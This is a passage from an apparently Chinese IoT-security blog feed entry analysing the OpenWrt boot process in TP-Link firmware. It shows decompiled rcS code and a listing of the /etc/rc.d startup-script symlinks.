class="string">&quot;valid format is rcS &lt;S|K&gt; &lt;param&gt;\n&quot;</span>, a3);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">fputs</span>((<span class="type">const</span> <span class="type">char</span> *)&amp;word_1162A, (FILE *)stderr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __fastcall <span class="title">sub_BB80</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> a2, <span class="type">int</span> a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">runqueue_init</span>((<span class="type">int</span>)&amp;unk_1ACD0);</span><br><span class="line">  dword_1AD04 = <span class="number">1</span>;</span><br><span class="line">  dword_1AD0C = a3;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">sub_B730</span>((<span class="type">int</span>)&amp;unk_1ACD0, <span class="string">&quot;/etc/rc.d&quot;</span>, a1, (<span class="type">int</span>)<span class="string">&quot;*&quot;</span>, a2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>大致的作用差不多是添加&#x2F;etc&#x2F;rc.d&#x2F;*下的脚本作为task并执行</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line">~/fr/t/_TL-WAR2/squashfs-root/etc ------------------------------------------------------------------------------------------------------------------</span><br><span class="line">&gt; ls -all ./rc.d    </span><br><span class="line">总用量 <span class="number">8</span></span><br><span class="line">drwxr-xr-x  <span class="number">2</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o <span class="number">4096</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> .</span><br><span class="line">drwxr-xr-x <span class="number">39</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o <span class="number">4096</span> <span class="number">12</span>月 <span class="number">25</span> <span class="number">15</span>:<span class="number">44</span> ..</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">19</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> K20miniupnpd -&gt; ../init.d/miniupnpd</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">15</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> K26pppox -&gt; ../init.d/pppox</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">18</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> K50dropbear -&gt; ../init.d/dropbear</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">13</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> K80uac -&gt; ../init.d/uac</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">20</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> K81apdb_check -&gt; ../init.d/apdb_check</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">18</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> K90wireless -&gt; ../init.d/wireless</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">14</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> K98boot -&gt; ../init.d/boot</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">22</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> K99luci_monitor -&gt; ../init.d/luci_monitor</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">16</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> K99sys_ha -&gt; ../init.d/sys_ha</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">16</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> K99umount -&gt; ../init.d/umount</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">20</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> S00sysfixtime -&gt; ../init.d/sysfixtime</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">19</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> S01led_early -&gt; ../init.d/led_early</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">14</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> S10boot -&gt; ../init.d/boot</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">16</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> S10system -&gt; ../init.d/system</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">15</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> S14tddpd -&gt; ../init.d/tddpd</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">17</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> S15loggerd -&gt; ../init.d/loggerd</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">19</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> S15rsa_check -&gt; ../init.d/rsa_check</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">17</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> S20network -&gt; ../init.d/network</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">16</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> S21switch -&gt; ../init.d/<span class="keyword">switch</span></span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">16</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> S25sysctl -&gt; ../init.d/sysctl</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">22</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> S26time_setting -&gt; ../init.d/time_setting</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">16</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> S31tmngtd -&gt; ../init.d/tmngtd</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">15</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> S40fstab -&gt; ../init.d/fstab</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">18</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> S40watchdog -&gt; ../init.d/watchdog</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">17</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> S42ipgroup -&gt; ../init.d/ipgroup</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">16</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> S42ippool -&gt; ../init.d/ippool</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">18</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> S45firewall -&gt; ../init.d/firewall</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">13</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> S46nat -&gt; ../init.d/nat</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">20</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> S47access_ctl -&gt; ../init.d/access_ctl</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">24</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> S47administration -&gt; ../init.d/administration</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">21</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> S47dos_defense -&gt; ../init.d/dos_defense</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">23</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> S47flood_defense -&gt; ../init.d/flood_defense</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">13</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> S47imb -&gt; ../init.d/imb</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">20</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> S47mac_filter -&gt; ../init.d/mac_filter</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">14</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> S50cron -&gt; ../init.d/cron</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">18</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> S50dropbear -&gt; ../init.d/dropbear</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">15</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> S50pppox -&gt; ../init.d/pppox</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">19</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> S50pure-ftpd -&gt; ../init.d/pure-ftpd</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">20</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> S50queueventd -&gt; ../init.d/queueventd</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">16</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> S50telnet -&gt; ../init.d/telnet</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">18</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> S50wireless -&gt; ../init.d/wireless</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">20</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> S52qos-tplink -&gt; ../init.d/qos-tplink</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">18</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> S60collectd -&gt; ../init.d/collectd</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">17</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> S60dnsmasq -&gt; ../init.d/dnsmasq</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">15</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> S60pptpd -&gt; ../init.d/pptpd</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">20</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> S60url_filter -&gt; ../init.d/url_filter</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">16</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> S60xl2tpd -&gt; ../init.d/xl2tpd</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">17</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> S62vpn_wan -&gt; ../init.d/vpn_wan</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">17</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> S65wifidog -&gt; ../init.d/wifidog</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">16</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> S69ipstat -&gt; ../init.d/ipstat</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">16</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> S69online -&gt; ../init.d/online</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">22</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> S70freeStrategy -&gt; ../init.d/freeStrategy</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">20</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> S70init_iface -&gt; ../init.d/init_iface</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">21</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> S70qca-nss-drv -&gt; ../init.d/qca-nss-drv</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">21</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> S70qca-nss-ecm -&gt; ../init.d/qca-nss-ecm</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">21</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> S72shortcut-fe -&gt; ../init.d/shortcut-fe</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">24</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> S76session_limits -&gt; ../init.d/session_limits</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">17</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> S80websort -&gt; ../init.d/websort</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">22</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> S83web_security -&gt; ../init.d/web_security</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">19</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> S85webfilter -&gt; ../init.d/webfilter</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">21</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> S89remote_mngt -&gt; ../init.d/remote_mngt</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">18</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> S90dnsproxy -&gt; ../init.d/dnsproxy</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">17</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> S93appdist -&gt; ../init.d/appdist</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">19</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> S93bwlist_qq -&gt; ../init.d/bwlist_qq</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">14</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> S93done -&gt; ../init.d/done</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">14</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> S93l2tp -&gt; ../init.d/l2tp</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">15</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> S93mwan3 -&gt; ../init.d/mwan3</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">25</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> S94default_balance -&gt; ../init.d/default_balance</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">19</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> S94isp_route -&gt; ../init.d/isp_route</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">22</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> S94load_balance -&gt; ../init.d/load_balance</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">19</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> S94miniupnpd -&gt; ../init.d/miniupnpd</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">22</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> S94policy_route -&gt; ../init.d/policy_route</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">22</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> S94static_route -&gt; ../init.d/static_route</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">17</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> S94sysntpd -&gt; ../init.d/sysntpd</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">15</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> S95ipsec -&gt; ../init.d/ipsec</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">19</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> S96cloud_sdk -&gt; ../init.d/cloud_sdk</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">22</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> S97cloud_client -&gt; ../init.d/cloud_client</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">17</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> S97cmxddns -&gt; ../init.d/cmxddns</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">22</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> S97dev_discover -&gt; ../init.d/dev_discover</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">21</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> S97dyn3322ddns -&gt; ../init.d/dyn3322ddns</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">22</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> S97luci_monitor -&gt; ../init.d/luci_monitor</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">16</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> S97phddns -&gt; ../init.d/phddns</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">23</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> S97storage_share -&gt; ../init.d/storage_share</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">16</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> S97sys_ha -&gt; ../init.d/sys_ha</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">21</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> S97sys_monitor -&gt; ../init.d/sys_monitor</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">23</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> S97system_params -&gt; ../init.d/system_params</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">17</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> S97tpddnsd -&gt; ../init.d/tpddnsd</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">16</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> S97uhttpd -&gt; ../init.d/uhttpd</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">20</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> S98apdb_check -&gt; ../init.d/apdb_check</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">13</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> S98led -&gt; ../init.d/led</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">13</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> S98uac -&gt; ../init.d/uac</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">24</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> S98zero_boot_done -&gt; ../init.d/zero_boot_done</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">27</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> S99commit_sysupgrade -&gt; ../init.d/commit_sysupgrade</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">17</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> S99devmngr -&gt; ../init.d/devmngr</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">18</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> S99powerctl -&gt; ../init.d/powerctl</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">17</span> <span class="number">6</span>月  <span class="number">26</span>  <span class="number">2019</span> S99thermal -&gt; ../init.d/thermal</span><br></pre></td></tr></table></figure><p>即执行&#x2F;etc&#x2F;init.d&#x2F;下的所有服务</p><p><strong>至此启动流程分析完毕</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;openwrt路由器启动流程&quot;&gt;&lt;a href=&quot;#openwrt路由器启动流程&quot; class=&quot;headerlink&quot; title=&quot;openwrt路由器启动流程&quot;&gt;&lt;/a&gt;openwrt路由器启动流程&lt;/h1&gt;&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot;</summary>
      
    
    
    
    <category term="IOT安全" scheme="http://s1nec-1o.github.io/categories/IOT%E5%AE%89%E5%85%A8/"/>
    
    
